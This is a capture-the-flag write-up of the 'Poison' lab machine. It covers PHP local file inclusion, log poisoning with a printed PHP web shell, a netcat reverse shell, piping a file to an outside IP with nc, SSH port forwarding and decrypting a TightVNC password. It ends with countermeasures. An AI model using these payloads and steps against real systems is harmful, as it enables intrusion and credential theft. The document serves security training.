#### Machine Release Date: March 24, 2018

## Summary

Poison was a medium level machine that had a PHP LFI vulnerability in its web application.
Exploiting this vulnerability, I was able to enumerate all users on the system and recover an SSH password.
Additionally, I was also able to exploit the LFI vulnerability to get remote code execution on the server via PHP log poisoning.
Leveraging the SSH password, I was able to own the `charix` user.
Once on the machine, I found a `tightvnc` server running with root privileges which I was eventually able to log in to.

## Skills Learned

* Exploiting PHP LFI Vulnerabilities
* PHP Log Poisioning
* Local Port Forwarding via SSH
* Decrypting VNC Passwords
* Basic FreeBSD Enumeration

## User Own (Sensitive Information Disclosure via PHP LFI Vulnerability)

Navigating to the web service on port 80, I was presented with the following web page:

![](/assets/images/htb-poison/poison-default-webpage.png)

After navigating to `http://10.10.10.84/browse.php?file=listfiles.php`, one of the variables suggested a `pwdbackup.txt` file:

![](/assets/images/htb-poison/poison-pwdbackup-discovery.png)

I therefore navigated to `http://10.10.10.84/pwdbackup.txt`:

![](/assets/images/htb-poison/poison-pwdbackup.png)

I then decoded the pwdbackup.txt 13 times as suggested from the author.

```bash
base64 -d pwdbackup.txt | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d
```

At this point, I had decoded the password `Charix!2#4%6&8(0`. Now, I just needed a list of users to use this password on.
In linux, SSH users are located in the `/etc/passwd` file. Since this was an LFI vulnerability, I was able to read any file on the system with the permissions of the web server.
I grabbed the `/etc/passwd` file at `http://10.10.10.84/browse.php?file=../../../../../../../../../etc/passwd`:

![](/assets/images/htb-poison/poison-lfi-etc-passwd.png)

I then made a wordlist from the /etc/passwd file:

```bash
grep csh passwd | cut -d':' -f1 > users.txt
```

The only users were `root` and `charix`.
With this information, I was able to log in as the `charix` user with their password `Charix!2#4%6&8(0`:

```
$ ssh charix@10.10.10.84

## User Own (Log Poisoning PHP LFI Vulnerability)

Whenever you find an LFI vulnerability, chances are you can poison the Apache httpd logs with PHP code and execute it.
**Keep in mind that with this kind of exploit, you only get one chance for your payload, since all it takes is one error for things to permanently go wrong (until a system administrator goes in and cleans up the logs)!**

I used the folloing code for poisoning the Apache logs with PHP code:

```php
<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>
```

I then sent the following HTTP request with Burp:

![](/assets/images/htb-poison/poison-log-poisoning-request.png)

Notice how the PHP payload is in the `User-Agent` field. I did this because the Apache access logs generally log the user agent.
If I can include the Apache access log file, via LFI, then I will execute that code as a backdoor.

From the /etc/passwd file, I was able to determine that Poison's operating system was running FreeBSD 11.1.
On this Linux distro, the Apache access log files are located at `/var/www/httpd-access.log`.

I then tested the LFI:

![](/assets/images/htb-poison/poison-log-poisoning-test.png)

Success! At this point, I encoded a netcat reverse shell from [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

![](/assets/images/htb-poison/poison-burp-url-encode-nc-revshell.png)

I then sent the new payload with Burp to get a reverse shell as the `www-data` user:

![](/assets/images/htb-poison/poison-burp-send-reverse-shell-to-webshell.png)

```

```

## Privilege Escalation (Root VNC Session Hijacking)

After owning the `charix` user, I switched to `/bin/sh` since `/bin/csh` doesn't understant the stderr (`2>`) operator.

```
charix@Poison:~ % find / -name user.txt 2>/dev/null
find: 2: unknown primary or operator
charix@Poison:~ % which bash
bash: Command not found.
charix@Poison:~ % which sh
/bin/sh
charix@Poison:~ % sh
$ find / -name user.txt 2>/dev/null
/home/charix/user.txt
$ cat /home/charix/user.txt
eaacdfb2d141b72a589233063604209c
```

And that was the user flag.

From here, I found an interesting `secret.zip` file in the `/home/charix` directory:

```

Attempting to unzip the `secret.zip` file resulted in a failure since it was password protected:

```
$ unzip secret.zip
Archive:  secret.zip
 extracting: secret |
unzip: Passphrase required for this entry
```

After doing some reasearch on the `unzip` tool in FreeBSD, there was no option to provide a password with it, so I transferred the file over to my Kali machine with `/bin/nc`.

On the Poison machine:

```
$ cat secret.zip - | nc 10.10.14.18 2001
$ sha1 secret.zip
SHA1 (secret.zip) = 7dc5857af34cddb9d6986dc721b269ffcc9b07be
```

On my kali machine:

```
kali@kali:~/htb/machines/poison/privesc$ ncat -nvlp 2001 > secret.zip
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2001
Ncat: Listening on 0.0.0.0:2001
Ncat: Connection from 10.10.10.84.
Ncat: Connection from 10.10.10.84:35079.

kali@kali:~/htb/machines/poison/privesc$ sha1sum secret.zip
7dc5857af34cddb9d6986dc721b269ffcc9b07be  secret.zip
```

Notice that I used the `SHA1` hashing algorithm to verify that the file didn't get corrupt in transport.
I then unzipped the secret with `charix`'s SSH password:

```
kali@kali:~/htb/machines/poison/privesc/secret$ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
 extracting: secret

kali@kali:~/htb/machines/poison/privesc/secret$ xxd secret
00000000: bda8 5b7c d596 7a21                      ..[|..z!
```

At this point, I continued on with enumerating the system.
The most suspicious process was a VNC server running as root:

```
$ ps aux | grep root
... CONTENT SNIPPED ...
root     529  0.0  0.9 23620  9100 v0- I    19:51     0:00.25 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120
... CONTENT SNIPPED ...
```

Since the `netstat` command on FreeBSD is a bit different from the `netstat` on most other Linux distributions, I enumerated for listening TCP ports with `sockstat`:

```
$ sockstat -4 -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS
root     sendmail   655   3  tcp4   127.0.0.1:25          *:*
www      httpd      653   4  tcp4   *:80                  *:*
www      httpd      652   4  tcp4   *:80                  *:*

www      httpd      649   4  tcp4   *:80                  *:*
root     httpd      634   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
```

Most interestingly, the `Xvnc` service was listeningo on ports 5901 and 5801. Port 5901 was the TightVNC service, and port 5801 was the TightVNC web service.
Since these services were listening locally, I was able to port-forward them to access them from my Kali machine.

```bash
ssh -N -L 127.0.0.1:5901:127.0.0.1:5901 -L 127.0.0.1:5801:127.0.0.1:5801 charix@10.10.10.84
```

After port forwarding both ports, I was able to login to root's TightVNC session leveraging the encoded TightVNC password:

```
$ vncviewer 127.0.0.1:5901 -passwd /home/kali/htb/machines/poison/privesc/secret
Connected to RFB server, using protocol version 3.8

  Least significant byte first in each pixel.

```

From here, I took over an xterm console on the desktop running as root:

![](/assets/images/htb-poison/poison-tight-vnc-window.png)

## Extra

TightVNC passwords are essentially 8 character passwords and can be easily decoded like below:

```
$ xxd -p secret
bda85b7cd5967a21
```

```
kali@kali:~/htb/machines/poison/privesc$ msfconsole -q
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["bda85b7cd5967a21"].pack('H*'), fixedkey
=> "VNCP@$$!"
```

I got the sample code [here](https://github.com/frizb/PasswordDecrypts).
You can then reuse the password to login to VNC.
In a larger network, you may even want to use that password for password spraying.

```

```

## Countermeasures

* Don't include other PHP files as variables since this is what created the LFI vulnerability.
* Don't leave hints about how to get your passwords.
* Put proper access controls on the TightVNC password files. You can generally find TightVNC password files in the `~/.vnc/passwd` file.
* Avoid reusing passwords.
